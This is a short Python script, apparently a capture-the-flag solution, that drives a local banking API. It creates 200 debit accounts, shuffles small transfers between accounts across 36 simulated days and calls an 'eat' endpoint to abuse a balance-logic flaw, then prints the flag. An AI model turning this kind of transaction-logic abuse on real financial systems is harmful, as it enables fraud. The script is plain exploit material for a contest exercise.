#!/usr/bin/env python3

import requests
import sys

session = requests.Session()
session.headers['Authorization'] = f'Bearer {sys.argv[1]}'

def get(method, **kwargs):
    r = session.get(f'http://localhost:8080/api/{method}', params=kwargs, timeout=10)
    assert r.ok
    return r.json()

def post(method, **kwargs):
    r = session.post(f'http://localhost:8080/api/{method}', json=kwargs, timeout=10)
    assert r.ok

post('reset')
post('create', type='credit')
for i in range(3, 203):
    post('create', type='debit')
    post('transfer', src=2, dst=i, amount=167)
for date in range(1, 37):
    print('date:', date)
    post('eat', account=1)
    for i in range(3, 170):
        post('transfer', src=i, dst=2, amount=1)
    for i in range(170, 203):
        post('transfer', src=i, dst=1, amount=1)
post('eat', account=1)
print(get('user')['flag'])
